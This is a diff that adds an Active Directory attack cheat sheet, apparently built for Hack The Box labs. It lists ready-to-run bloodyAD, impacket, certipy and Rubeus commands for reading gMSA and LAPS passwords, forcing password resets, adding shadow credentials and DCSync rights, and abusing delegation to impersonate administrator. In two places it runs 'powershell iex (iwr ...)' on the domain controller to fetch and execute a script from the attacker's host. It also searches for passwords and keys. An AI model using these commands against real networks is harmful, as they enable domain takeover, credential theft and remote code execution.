@@ -1,0 +1,130 @@
+# Active Directory
+## +---------- Guide ----------+
+https://github.com/CravateRouge/bloodyAD/wiki/User-Guide
+
++---------- .ccache ----------+
+impacket-getTGT -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD'; kcme
+
++---------- .ccache to evil-winrm ----------+
+evil-winrm-py -i $TARGET -k --no-pass --spn-prefix ldap   # cifs, host, http
+
++---------- ReadGMSAPassword ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object 'SVC_ACC$' --attr msDS-ManagedPassword
+
++---------- ReadLAPSPassword ----------+
+impacket-GetLAPSPassword -dc-ip $TARGET $DOM/'$USERNAME:$PASSWORD' | awk '$1 ~ /\$$/ {print $1 " --> Administrator:" $3}'
+
++---------- AddKeyCredentialLink ----------+
+certipy shadow auto -dc-ip $TARGET -target $DC -k -account 'SVC_CABACKUP'
+
++---------- AddSelf ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'; kcme
+
++---------- Owns ----------+
+impacket-dacledit -dc-ip $TARGET $DOM/ -k -action 'write' -rights 'WriteMembers' -principal '$USERNAME' -target-dn 'DistinguishedName'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' '$USERNAME'
+
++---------- GenericWrite ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set object 'DistinguishedName' servicePrincipalName -v 'http/anything'
+impacket-GetUserSPNs -dc-ip $TARGET -dc-host $DC $DOM/ -k -no-pass -usersfile usernames
+certipy shadow auto -target $DC -u '$USERNAME' -k -account 'TargetUser'
+
++---------- ForceChangePassword ----------+
+impacket-changepasswd $DOM/'TARGET_USER'@$TARGET -newpass '123qweasdF!' -altuser 'USER_WITH_PRIV' -althash '89d0b56874f61ad38bad336a77b8ef2f' -reset
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set password 'DistinguishedName' '123qweasdF!'
+impacket-getTGT $DOM/'$USERNAME:123qweasdF!'; kcme
+
++---------- Remove Protected ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k remove groupMember 'CN=PROTECTED OBJECTS,CN=USERS,DC=RUSTYKEY,DC=HTB' 'CN=IT,CN=USERS,DC=RUSTYKEY,DC=HTB'
+
++---------- AddAllowedToAct / AllowedToAct ----------+
+Set-ADComputer -PrincipalsAllowedToDelegateToAccount "OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
+export OWNED_COMPUTER='' # without $ sign
+impacket-getTGT $DOM/"$OWNED_COMPUTER$":'$PASSWORD'; kcme
+impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate administrator -spn "cifs/$DC"; mv *administrator@*.ccache administrator.ccache
+impacket-getST -dc-ip $TARGET $DOM/"$OWNED_COMPUTER$" -k -no-pass -impersonate backupadmin -spn "cifs/$DC"; mv *backupadmin@*.ccache administrator.ccache;
+kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:53/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+
+$OWNED_COMPUTER='' # without $ sign
+Set-ADComputer -PrincipalsAllowedToDelegateToAccount "$OWNED_COMPUTER$" -Identity 'DC_COMPUTER_NAME'
+$ComputerSid = Get-DomainComputer "$OWNED_COMPUTER" -Properties objectsid | Select -Expand objectsid; $SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$($ComputerSid))"; $SDBytes = New-Object byte[] ($SD.BinaryLength); $SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer DC_COMPUTER_NAME | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+.\Rubeus.exe hash /password:OWNED_COMPUTER_PASSWORD
+.\Rubeus.exe s4u /user:"$OWNED_COMPUTER$" /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:administrator /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
+.\Rubeus.exe s4u /user:"$OWNED_COMPUTER$" /rc4:B52B582F02F8C0CD6320CD5EAB36D9C6 /impersonateuser:backupadmin /msdsspn:cifs/dc.rustykey.htb /ptt /nowrap
+[+] Ticket successfully imported!
+kirbi2ccache doIGfjCCBnqgAwIBB<SNIP>BASE64 HERE... administrator administrator.ccache;
+kcme; impacket-atexec -dc-ip $TARGET $DC -k -no-pass "powershell -c iex (iwr -useb http://$MYIP:53/ROOT.ps1)" | grep -vE '\[|-' | xargs -n1 | gg
+
++---------- Forest Trust ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get trusts
+impacket-wmiexec -dc-ip $TARGET $DC -k -no-pass "powershell -c \"Import-Module 'ActiveDirectory'; @(Get-ADDomain | Select @{n='Name';e={$_.DNSRoot}},@{n='securityIdentifier';e={$_.DomainSID}},@{n='trustType';e={'Primary'}},@{n='trustDirection';e={'Inbound/Outbound'}}; Get-ADObject -LDAPFilter '(objectClass=trustedDomain)' -Properties * | Select @{n='Name';e={$_.Name}},@{n='securityIdentifier';e={$_.securityIdentifier}},@{n='trustType';e={switch ($_.trustType){1{'NT'}2{'Active Directory'}3{'External'}default{$_}}}},@{n='trustDirection';e={switch ($_.trustDirection){1{'Inbound'}2{'Outbound'}3{'Bidirectional'}default{$_}}}}) | Format-Table -AutoSize\""
+
++---------- Add ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add genericAll 'DistinguishedName' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add groupMember 'DistinguishedName' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k set owner 'DistinguishedName' 'USER'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add user 'myuser' '123qweasdF!'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add computer 'mypc' '123qweasdF!'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add rbcd 'TARGET' 'SERVICE'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dcsync 'TRUSTEE'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add shadowCredentials 'TARGET'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add add uac 'TARGET'
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k add dnsRecord 'xxx.domain.example' '8.8.8.8'
+
++---------- Get ----------+
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get writable --detail
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get object User | grep -Ei 'pass|pwd' | grep -vE 'bad|Last|Time' | cat
+
++---------- Search ----------+
+-->> Computers
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306368)))" | grep -av 'nTSecurityDescriptor:' | tee out_computers-info
+
+-->> Users
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=user)(!(sAMAccountType=805306369)))" | grep -av 'nTSecurityDescriptor:' | tee out_users-info
+
+-->> Members of Groups
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=group)(member=*))" --attr 'member','sAMAccountName' | sed -E '/^member: /{s/member: //;s/; */;\n/g;s/^/member:\n/;}' | tee out_membersofgroups-info
+
+-->> Passwords and Keys
+bloodyAD --dc-ip $TARGET --host $DC -d $DOM -k get search --filter "(&(objectClass=*))" | grep -a -Ei 'pass|pwd|key'
+
++---------- Permissions ----------+
+adminCount
+AllExtendedRights
+description
+displayName
+distinguishedName
+ForceChangePassword
+GenericAll
+GenericWrite
+homeDirectory
+logonHours
+logonWorkstation
+member
+memberOf
+msDS-AllowedToActOnBehalfOfOtherIdentity
+msDS-AllowedToDelegateTo
+msDS-GroupMSAMembership
+msDS-KeyCredentialLink
+msDS-ManagedPassword
+msDS-PrimaryComputer
+primaryGroupID
+profilePath
+ResetPassword
+sAMAccountName
+scriptPath
+Self
+servicePrincipalName
+tokenGroups
+unicodePwd
+UserAccountControl
+ValidatedMSDS-AllowedToActOnBehalfOfOtherIdentity
+ValidatedSPN
+WriteDacl
+WriteOwner
+
+
+# Active Directory: CS
+
+# Active Directory: GPO
